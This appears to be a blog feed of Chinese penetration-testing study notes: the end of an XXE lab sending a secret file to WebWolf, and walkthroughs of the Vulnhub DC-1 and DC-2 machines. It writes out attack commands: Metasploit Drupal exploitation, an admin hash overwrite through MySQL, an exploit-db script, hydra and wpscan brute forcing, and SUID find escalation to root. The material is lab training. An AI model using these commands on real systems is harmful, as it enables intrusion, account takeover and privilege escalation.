class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="symbol">&amp;send;</span> </span></span><br><span class="line"><span class="language-xml">     //再调用%write里的&amp;send变量，这个变量是再嵌套的DTD语句中声明，所以需要在xml里调用</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure>

<p>虽然提示是报错，但是我们到我们的<code>webwolf</code>上查看</p>
<p><img src="/2022/06/21/underline-learning/image-20221018140310837.png" alt="image-20221018140310837"></p>
<hr>
<p>这个是<code>secret.txt</code>的值，我们看看<code>webwolf</code>上有没有获得该数据</p>
<p><img src="/2022/06/21/underline-learning/image-20221017234256596.png" alt="image-20221017234256596"></p>
<hr>
<p>成功获取</p>
<p><img src="/2022/06/21/underline-learning/image-20221018141126472.png" alt="image-20221018141126472"></p>
<p>成功</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>线下靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn学习记录</title>
    <url>/2022/10/25/pwn%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><code>学校必修学习一下二进制如何提权，下面记录一下我学习pwn的记录</code></p>
<span id="more"></span>

<h1 id="1-搭建pwn环境"><a href="#1-搭建pwn环境" class="headerlink" title="1.搭建pwn环境"></a>1.搭建pwn环境</h1><p><a href="https://blog.csdn.net/qq_41202237/article/details/118188924?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166606630016782390599725%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166606630016782390599725&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118188924-null-null.142%5Ev58%5Epc_search_tree,201%5Ev3%5Eadd_ask&utm_term=ubuntu20.04pwn&spm=1018.2226.3001.4187">推荐文章</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">注意一定要做完保存一次快照，防止自我炸裂，重新开始</span><br><span class="line">建议配三个拍一次</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶场学习笔记</title>
    <url>/2022/08/29/vulnhub/</url>
    <content><![CDATA[<p><u><code>学习一下实战靶场，做一下笔记</code></u></p>
<p><code>实战环境，</code></p>
<p><code>信息收集的能力决定了能否渗透成功，以及自己会浪费自己多少时间</code></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>官网下载地址</p>
<blockquote>
<p><a href="http://www.vulnhub.com/">http://www.vulnhub.com/</a></p>
</blockquote>
<p>这里提一下靶场机<code>ip</code>怎么看</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span> </span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220829153949360.png" alt="image-20220829153949360"></p>
<blockquote>
<p><code>nmap -sP  192.168.133.134/24</code><br>&#x2F;&#x2F;192.168.133.134是虚拟机ip</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></p>
<p>找到靶机<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>习惯性用<code>nmap</code>扫一下它端口</p>
<p><img src="/2022/08/29/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></p>
<hr>
<h1 id="DC系列【1-9】-完"><a href="#DC系列【1-9】-完" class="headerlink" title="DC系列【1~9】(完)"></a>DC系列【1~9】(完)</h1><h1 id="一、DC-1-初级"><a href="#一、DC-1-初级" class="headerlink" title="一、DC-1[初级]"></a>一、DC-1[初级]</h1><p><strong>five flags</strong></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>浏览器访问靶机<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>这是开始界面</p>
<p><img src="/2022/08/29/vulnhub/image-20220829154626618.png" alt="image-20220829154626618"></p>
<p>这里介绍一个插件<code>Wappalyzer</code>，它能够获取网页自身的框架和编写的语言，这样就不用查看网络返回包来分析了</p>
<p><img src="/2022/08/29/vulnhub/image-20220830094043837.png" alt="image-20220830094043837"></p>
<p>可以看到网站是用<code>php</code>语言编写的，<code>CMS</code>是<code>Drupal</code></p>
<hr>
<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>先用<code>msf</code>看看有没有<code>drupal</code>相应的攻击脚本</p>
<blockquote>
<p>终端输入<code>msfconsole</code>，进入<code>msf</code>界面，或者菜单也可以打开</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830094506049.png" alt="image-20220830094506049"></p>
<blockquote>
<p>输入<code>search drupal</code>，找一下有没有drupal可以利用的脚本<br><em>对于其他命令，可以用help查询</em></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>
<blockquote>
<p>输入<code>use 1</code>，进入编号1脚本的运行环境</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830095106784.png" alt="image-20220830095106784"></p>
<blockquote>
<p>输入<code>show options</code>,查看脚本运行的所需要配置的项目</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830105519336.png" alt="image-20220830105519336"></p>
<blockquote>
<p><code>Required</code>是要求填的，<code>yes</code>是必填项，<code>no</code>是非必填项</p>
</blockquote>
<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>
<blockquote>
<p>输入<code>set RHOSTS 192.168.133.136</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830110143969.png" alt="image-20220830110143969"></p>
<blockquote>
<p>再输入<code>run</code>，运行脚本</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830110303594.png" alt="image-20220830110303594"></p>
<blockquote>
<p>输入<code>shell</code>，进入<code>shell</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830110551273.png" alt="image-20220830110551273"></p>
<blockquote>
<p>输入<code>whoami</code>，查看当前的权限</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>发现是个低权限的账号</p>
<blockquote>
<p>输入<code>ls</code>，可以查看到当前的目录文件</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>但是一堆东西挤在一起，还是有些不太方便</p>
<h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="*交互式shell"></a><code>*交互式shell</code></h3><p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220830110907408.png" alt="image-20220830110907408"></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>发现<code>flag1.txt</code></p>
<blockquote>
<p>输入<code>cat flag1.txt</code>查看</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830142915555.png" alt="image-20220830142915555"></p>
<blockquote>
<p><code>Every good CMS needs a config file - and so do you.</code><br>意思是：一个好的CMS（内容管理系统）需要一个config file（配置文件）</p>
<p>也就是我们需要看看它的配置文件，这是Flag2的线索</p>
</blockquote>
<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>在目录下我们发现有个<code>sites</code>目录，也就是站点目录，里面很有可能有配置文件</p>
<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<blockquote>
<p>输入<code>cd sites;ls -a</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830143404972.png" alt="image-20220830143404972"></p>
<p>有个<code>default</code>（默认）目录，查看一下</p>
<blockquote>
<p>输入<code>cd default;ls -a</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830143517235.png" alt="image-20220830143517235"></p>
<p>看到<code>setting.php</code>也就差不多是<code>config file</code></p>
<blockquote>
<p>输入<code>cat setting.php</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830143752469.png" alt="image-20220830143752469"></p>
<p>得到<code>Flag2</code></p>
<blockquote>
<ul>
<li><p><code>flag2</code></p>
</li>
<li><p><code>Brute force and dictionary attacks aren&#39;t the</code></p>
</li>
<li><p><code>only ways to gain access (and you WILL need access).</code></p>
</li>
<li><p><code>What can you do with these credentials?</code></p>
<p> 意思是：暴力和字典攻击不是获得访问权限的唯一方法（您将需要访问权限）。<br> 你能用这些证书做什么？</p>
</li>
</ul>
<p>就是说不要局限于爆破密码来登录admin用户，你拥有了数据库这些信息，你可以做什么</p>
</blockquote>
<hr>
<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>关键分析这里，这是靶机数据库的用户名和密码的信息，</p>
<p>有了这个我们就可以进入靶机的数据库，对里面的数据库进行修改或增添</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">     <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   )</span><br></pre></td></tr></table></figure>

<h3 id="1）mysql数据库修改admin用户的密码（或者新建一个用户密码）"><a href="#1）mysql数据库修改admin用户的密码（或者新建一个用户密码）" class="headerlink" title="1）mysql数据库修改admin用户的密码（或者新建一个用户密码）"></a>1）mysql数据库修改admin用户的密码（或者新建一个用户密码）</h3><blockquote>
<p>输入<code>mysql -udbuser -pR0ck3t</code></p>
<p>*注意这里-u和-p后面没有空格，有空格会报错</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830151236620.png" alt="image-20220830151236620"></p>
<p>先看看数据库</p>
<blockquote>
<p>输入<code>show databases;</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830151531028.png" alt="image-20220830151531028"></p>
<p>查看<code>drupaldb</code>库里的表</p>
<blockquote>
<p>输入<code>use drupaldb;</code><br>然后输入<code>show tables;</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830151716900.png" alt="image-20220830151716900"></p>
<p>看到<code>users</code>表，这就是我们登录成功的关键，查看该表</p>
<p><img src="/2022/08/29/vulnhub/image-20220830151829478.png" alt="image-20220830151829478"></p>
<p>发现有两个用户，我们的目的是修改或者获得admin用户的密码，当然也可以再创建一个用户，但是都需要加密</p>
<blockquote>
<p>因为这里我们可以发现用户的密码是被加密了的，那加密文件肯定是在脚本目录里，也就是scripts目录里，利用加密脚本，把我们的密码加密，然后更新数据库里admin用户原本的密码</p>
</blockquote>
<p>我们来找找密码加密脚本在哪里</p>
<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>看到<code>scripts</code>目录</p>
<p>进入查看</p>
<blockquote>
<p>输入<code>cd scripts;ls -a</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830152428416.png" alt="image-20220830152428416"></p>
<p>发现有一个<code>password-hash.sh</code>文件，密码就是通过它进行hash加密的</p>
<p>运行它，让它把我们的密码加密</p>
<blockquote>
<p>输入<code>./password-hash.sh  123456</code></p>
</blockquote>
<hr>
<p>但是运行可能会出现如下错误，如果没有请忽略</p>
<p><img src="/2022/08/29/vulnhub/image-20220830152851541.png" alt="image-20220830152851541"></p>
<p>报错说</p>
<blockquote>
<p><code>include_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory</code> </p>
</blockquote>
<p>也就是找不到该文件，但是发现，includes目录确实也不在scripts目录下，于是用cp把<code>includes</code>目录放到<code>scripts</code>目录下即可</p>
<blockquote>
<p>输入<code>cp -r ../includes ./</code></p>
</blockquote>
<hr>
<p>得到加密数据</p>
<p><img src="/2022/08/29/vulnhub/image-20220830153417077.png" alt="image-20220830153417077"></p>
<p>再次进入<code>mysql</code>数据库，修改 <code>admin</code>密码</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="built_in">set</span> <span class="attribute">pass</span>=<span class="string">&quot;<span class="variable">$S</span><span class="variable">$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x</span>&quot;</span> where <span class="attribute">name</span>=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220830161703412.png" alt="image-20220830161703412"></p>
<p>我们试试能不能登录</p>
<blockquote>
<p>用户名：<code>admin</code></p>
<p>密码：<code>123456</code></p>
</blockquote>
<p>登录成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220830161808584.png" alt="image-20220830161808584"></p>
<p>得到flag3</p>
<p><img src="/2022/08/29/vulnhub/image-20220830161837967.png" alt="image-20220830161837967"></p>
<h3 id="2）利用drupal脚本添加管理员用户"><a href="#2）利用drupal脚本添加管理员用户" class="headerlink" title="2）利用drupal脚本添加管理员用户"></a>2）利用drupal脚本添加管理员用户</h3><p>优点是更加方便，快捷，<strong>但是脚本不是万能的，只有自己明白原理才是真正掌握</strong>，这个的本质也是利用<code>sql</code>注入</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">34992</span></span><br></pre></td></tr></table></figure>

<p>该网站在kali里面浏览器书签自带的，这个脚本适用于drupal，直接下载下来用即可</p>
<p><img src="/2022/08/29/vulnhub/image-20220830145453216.png" alt="image-20220830145453216"></p>
<p>下载好后，运行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python2</span> <span class="number">34992</span>.py -t http://<span class="number">192.168.133.136</span> -u admin001 -p <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>-t就是目标网站，-u就是新建的用户名，-p就是用户名密码<br>*注意这个脚本需要 python2运行，python3语法不符合</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830145642143.png" alt="image-20220830145642143"></p>
<p>然后按照输入的，直接登录就可以了，或者直接点击下面链接</p>
<p><img src="/2022/08/29/vulnhub/image-20220830153620620.png" alt="image-20220830153620620"></p>
<p>就可以拿到<code>Flag3</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220830154431807.png" alt="image-20220830154431807"></p>
<hr>
<h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><h3 id="1）个人方法"><a href="#1）个人方法" class="headerlink" title="1）个人方法"></a>1）个人方法</h3><p>分析一下<code>flag3</code></p>
<blockquote>
<p><code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</code></p>
<p>意思是：Special PERMS特别的权限（应该是root权限），passwd应该是查看&#x2F;etc&#x2F;passwd目录，FIND意思利用find命令，-exec就是需要用它执行命令， get what’s in the shadow意思是flag4在&#x2F;etc&#x2F;shadow里</p>
</blockquote>
<p>我们先看看<code>etc</code>目录</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163045108.png" alt="image-20220830163045108"></p>
<p>发现了<code>passwd</code>文件</p>
<blockquote>
<p>输入<code>cat passwd</code></p>
</blockquote>
<p>查看一下内容</p>
<p>发现有<code>flag4</code>的线索</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163220380.png" alt="image-20220830163220380"></p>
<p><code>flag4</code>是在<code>/home/flag4</code>里面，我们到目录里看看</p>
<blockquote>
<p>输入<code>cd /home/flag4</code></p>
</blockquote>
<p>发现有个<code>flag4.txt</code>，查看</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></p>
<p>得到<code>flag4</code></p>
<h3 id="2）官方方法"><a href="#2）官方方法" class="headerlink" title="2）官方方法"></a>2）官方方法</h3><p>用了<code>hydra</code>[九头蛇]工具，对我们在<code>passwd</code>里看到<code>flag4</code>用户进行爆破</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是<br>用户所在的网站</p>
<p>上面-p的文件是自己下载的密码包</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>
<p>然后用<code>ssh</code>连接</p>
<blockquote>
<p>输入<code>ssh flag4@192.168.133.136</code><br>然后yes<br>然后输入密码：<code>orange</code></p>
</blockquote>
<p>进入<code>flag4</code>用户页面，</p>
<blockquote>
<p>输入<code>cat flag4.txt</code><br>得到flag4</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></p>
<hr>
<h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><blockquote>
<p>分析一下flag5<br><code>Can you use this same method to find or access the flag in root?</code></p>
<p><code>Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></p>
<p>意思是：您可以使用相同的方法查找或访问根目录中的标志吗？</p>
<p>可能但也许这并不容易。也许是这样？</p>
</blockquote>
<p><code>root</code>应该就是需要提权了</p>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p><code>linux</code>提权操作可以看一下我的<code>WEB随笔</code>里<code>suid</code>提权，下面只记录流程</p>
<blockquote>
<p>输入<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，查看目录下suid权限所有可执行二进制文件</p>
</blockquote>
<p>发现<code>find</code>目录</p>
<p><img src="/2022/08/29/vulnhub/image-20220830162407934.png" alt="image-20220830162407934"></p>
<p>于是可以利用<code>find</code>获取<code>root</code>权限<code>shell</code></p>
<p>主要是要让<code>find</code>命令成功执行，找一个存在的文件即可</p>
<blockquote>
<p>以在根目录为例<br>输入<code>find / -name initrd.img -exec &quot;/bin/sh&quot; \;</code></p>
</blockquote>
<p>提权成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></p>
<p>我们在<code>flag4</code>里知道，最后的旗子在<code>root</code>目录里</p>
<blockquote>
<p>输入<code>cd /root;ls -a</code></p>
</blockquote>
<p>发现<code>thefinalflag.txt</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220830164848589.png" alt="image-20220830164848589"></p>
<blockquote>
<p><code>Well done!!!!</code></p>
<p><code>Hopefully you&#39;ve enjoyed this and learned some new skills.</code></p>
<p><code>You can let me know what you thought of this little journey</code><br><code>by contacting me via Twitter - @DCAU7</code><br>意思是：<br>做得好！！！！</p>
<p>希望你喜欢这一点，并学习了一些新技能。</p>
<p>你可以告诉我你对这次小旅行的看法<br>通过Twitter联系我-@DCAU7 </p>
</blockquote>
<p><strong>5个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="二、DC-2-初级"><a href="#二、DC-2-初级" class="headerlink" title="二、DC-2[初级]"></a>二、DC-2[初级]</h1><p><strong>five flags</strong></p>
<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p> 先用<code>nmap</code>扫描一些</p>
<blockquote>
<p>输入<code>nmap -p- 192.168.133.138</code></p>
</blockquote>
<p>发现内容太少了</p>
<p><img src="/2022/08/29/vulnhub/image-20220831205238565.png" alt="image-20220831205238565"></p>
<blockquote>
<p>输入<code>nmap -p- 192.168.133.138 -A</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>发现<code>7744</code>端口运行的<code>ssh</code>，<code>22</code>端口被换了</p>
<blockquote>
<p>Ssh是一个安全的远程登录协议,它的端口号默认是22端口</p>
</blockquote>
<blockquote>
<p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。</p>
</blockquote>
<p>我们试试访问我们的靶机<code>ip</code>：<code>192.168.133.138</code></p>
<hr>
<p>但是访问失败【如果没有问题，可以忽略】</p>
<p><img src="/2022/08/29/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></p>
<p>可以看到，访问<code>IP</code>的时候进行了一个跳转，跳转到了<code>http://dc-2</code>，且无法访问</p>
<p>我猜测是<code>hosts</code>文件没有修改，所以域名无法登录</p>
<p>需要在<code>hosts</code>其中添加域名：<code>http://dc-2</code>和其ip：<code>192.168.133.138</code>，<code>dns</code>才能正常转换</p>
<blockquote>
<p>输入<code>vi /etc/hosts</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831211542540.png" alt="image-20220831211542540"></p>
<p>向其中添加</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.138</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220831212553718.png" alt="image-20220831212553718"></p>
<p>刷新浏览器，再次访问<code>192.168.133.138</code>或<code>http://dc-2</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></p>
<p>成功连接</p>
<hr>
<h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>进入网页就看到<code>flag</code>了</p>
<p><img src="/2022/08/29/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></p>
<p>点击打开查看</p>
<p><img src="/2022/08/29/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></p>
<blockquote>
<p><code>Flag 1:</code></p>
<p><code>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</code></p>
<p><code>More passwords is always better, but sometimes you just can’t win them all.</code></p>
<p><code>Log in as one to see the next flag.</code></p>
<p><code>If you can’t find it, log in as another.</code></p>
<p>意思是：<br>你通常的密码表可能不起作用，因此，也许你只需要成为cewl。</p>
<p>密码越多越好，但有时你无法赢得所有密码。</p>
<p>作为一个登录以查看下一个标志。</p>
<p>如果找不到，请作为另一个登录</p>
<p>·Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。</p>
<p>那我们就用cewl工具试一下<br>*不会工具一般用-h就可以知道使用说明</p>
</blockquote>
<hr>
<h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>根据<code>flag1</code>，我们用<code>cewl</code>试试生成字典</p>
<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><blockquote>
<p>输入<code>cewl http://dc-2/ &gt;pass.txt</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>目录下就会生成<code>pass.txt</code></p>
<blockquote>
<p>输入<code>cat pass.txt</code>，查看内容</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>发现是生成对应网站的密码字典</p>
<p><code>flag1</code>整理信息好像差不多了，下面我们利用<code>dc1</code>提到的<code>wappalyzer</code>，查看一下网页的框架结构有没有什么线索</p>
<p><img src="/2022/08/29/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></p>
<p>发现网站的<code>CMS</code>是<code>WordPress</code>，还可以看到它的主题是<code>Twenty Seventeen</code></p>
<p>那<code>wordpress</code>，有没有什么漏洞可以供我们利用呢，下面就提及另一个工具</p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><blockquote>
<p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
</blockquote>
<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
<blockquote>
<p>输入<code>wpscan --url http://dc-2 -e u</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>然后往下看用户名</p>
<p><img src="/2022/08/29/vulnhub/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>
<blockquote>
<p>输入<code>vi un.txt</code></p>
<p>把<code>admin</code> <code>jerry</code> <code>tom</code>复制进去</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>然后就可以结合我们的密码文本和用户名文本，利用<code>wpscan</code>这个工具，进行爆破操作了</p>
<blockquote>
<p>输入<code>wpscan --url http://dc-2 -P pass.txt -U un.txt</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>稍微等一会</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p><code>admin</code>用户密码没有找到，应该是最高权限的账号</p>
<p>但是<code>jerry</code>和<code>tom</code>用户的密码已经知道了</p>
<p>下面，我们就要开始找登录的页面了，一般是后台网站</p>
<p>我们可以用<code>dirsearch</code>工具进行扫描看看</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></p>
<p>发现网站</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></p>
<p>用我们之前获得的用户名和密码登录试试</p>
<p>以<code>jerry</code>为例，好像用<code>tom</code>会显示密码错误</p>
<p>在<code>page</code>窗口发现<code>flag2</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></p>
<p>点开查看，得到flag2</p>
<p><img src="/2022/08/29/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></p>
<blockquote>
<p><code>Flag 2:</code></p>
<p><code>If you can&#39;t exploit WordPress and take a shortcut, there is another way.</code></p>
<p><code>Hope you found another entry point.</code><br>意思是：<br>如果你不能利用WordPress并走捷径，还有另一种方法。</p>
<p>希望你能找到另一个切入点。 </p>
</blockquote>
<hr>
<h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>根据<code>flag2</code>的提示，实际上就是说从<code>wordpress</code>这条路是行不通的，要从另外的方向</p>
<p>但是如果<code>wordpress</code>行不通，而这个网站就是<code>wordpress</code>搭建起来的，那么这个网站的就不能下手</p>
<p>虽然网站的<code>80</code>端口的<code>http</code>行不通</p>
<p>但是我们之前用<code>nmap</code>扫了一下，发现端口<code>7744</code>运行着<code>ssh</code>，那我们能不能利用<code>ssh</code>登录成功呢</p>
<p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>我们先用之前用过的工具<code>hydra</code>进行爆破一下，看看这个<code>ssh</code>的用户是谁</p>
<blockquote>
<p>输入<code>hydra -l un.txt -P pass.txt 192.168.133.138 ssh -s 7744</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></p>
<p>发现<code>tom</code>账号是在这里登录</p>
<p><img src="/2022/08/29/vulnhub/image-20220831231405322.png" alt="image-20220831231405322"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.138</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220831231449571.png" alt="image-20220831231449571"></p>
<p>登录成功后，<code>ls</code>发现<code>flag3.txt</code></p>
<blockquote>
<p>输入<code>cat flag3.txt</code>，查看内容</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></p>
